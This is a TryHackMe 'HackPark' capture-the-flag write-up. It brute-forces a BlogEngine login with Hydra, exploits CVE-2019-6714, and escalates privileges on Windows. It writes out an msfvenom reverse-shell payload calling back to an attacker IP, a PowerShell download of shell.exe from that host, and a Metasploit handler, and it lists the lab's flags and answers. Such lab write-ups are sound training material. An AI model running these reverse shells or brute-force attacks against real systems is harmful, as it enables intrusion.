---
title: "HackPark — TryHackMe"
date: 2025-01-01
hideDate: true
draft: false
tags: ["tryhackme", "medium"]
categories: ["writeups"]
summary: "Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!"
ShowToc: true
TocOpen: false
cover:
  image: "00-card.png"
  alt: "HackPark"
  relative: true
---

## **Deploy the vulnerable Windows machine**

![hackpark win](hackpark-win.png)

![hackpark scan](hackpark-scan.png)

![hackpark pennywise](hackpark-pennywise.png)

## **Using Hydra to brute-force a login**

![hackpark hydra](hackpark-hydra.png)

![hackpark login page](hackpark-login-page.png)
![hackpark post request](hackpark-post-request.png)

Now we know the **request type** and have a **URL** for the login form, we can get started brute-forcing an account.

Run the following command but fill in the blanks:

`hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form`

1qaz2wsx
![hackpark login request](hackpark-login-request.png)
![hackpark hydra command](hackpark-hydra-command.png)

![hackpark hydra login pass](hackpark-hydra-login-pass.png)

|   |   |
|---|---|

## **Compromise the machine**

3.3.6.0
![hackpark blogengine version](hackpark-blogengine-version.png)

CVE-2019-6714
![hackpark exploit cve](hackpark-exploit-cve.png)

iis apppool\blog

![hackpark edit cve](hackpark-edit-cve.png)
![hackpark exploit upload](hackpark-exploit-upload.png)

![hackpark webserver flag](hackpark-webserver-flag.png)

## **Windows Privilege Escalation**

![hackpark metasploit](hackpark-metasploit.png)

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

Our netcat session is a little unstable, so lets generate another reverse shell using `msfvenom`. If you don't know how to do this, I suggest checking out the [Metasploit module](https://tryhackme.com/module/metasploit)!

_Tip:You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!_

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.21.174.19 LPORT=7575 -f exe -o shell.exe 

powershell -c wget "http://10.21.174.19:8000/shell.exe" -outfile "shell.exe"

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
run
```
![hackpark msfvenom shell](hackpark-msfvenom-shell.png)

![hackpark shell upload](hackpark-shell-upload.png)
![hackpark multi handler](hackpark-multi-handler.png)

You can run metasploit commands such as `sysinfo` to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/strozfriedberg/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.

Windows 2012 R2 (6.3 Build 9600)

![hackpark sysinfo](hackpark-sysinfo.png)

```
upload <path of winPeas>

shell  
winPEASx64.exe
```
![hackpark winpeas uploa](hackpark-winpeas-uploa.png)
![hackpark winpeas service](hackpark-winpeas-service.png)
![hackpark systemscheduler](hackpark-systemscheduler.png)

WindowsScheduler

Message.exe

![hackpark events dir](hackpark-events-dir.png)

![hackpark msfvenom message](hackpark-msfvenom-message.png)
![hackpark message upload](hackpark-message-upload.png)
![hack park multi handler message](hack-park-multi-handler-message.png)
![hackpark message overwrite](hackpark-message-overwrite.png)

759bd8af507517bcfaede78a21a73e39

![hackpark user flag jeff](hackpark-user-flag-jeff.png)

7e13d97f05f7ceb9881a3eb3d78d3e72

![hackpark root flag](hackpark-root-flag.png)

## **Privilege Escalation Without Metasploit**

![winPEAS](winpeas-2.png)

Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.

Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.  

Now we can generate a more stable shell using `msfvenom`, instead of using a meterpreter. This time let's set our payload to `windows/shell_reverse_tcp`.

After generating our payload we need to pull this onto the box using [powershell](https://tryhackme.com/room/powershell).

_Tip: It's common to find `C:\Windows\Temp` is world writable!_

Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! ([You can find winPEAS here](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASbat))

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

_Tip: You can execute these files by using .\filename.exe_

Using winPeas, what was the Original Install time? (This is date and time)
`   8/3/2019 10:43:23   `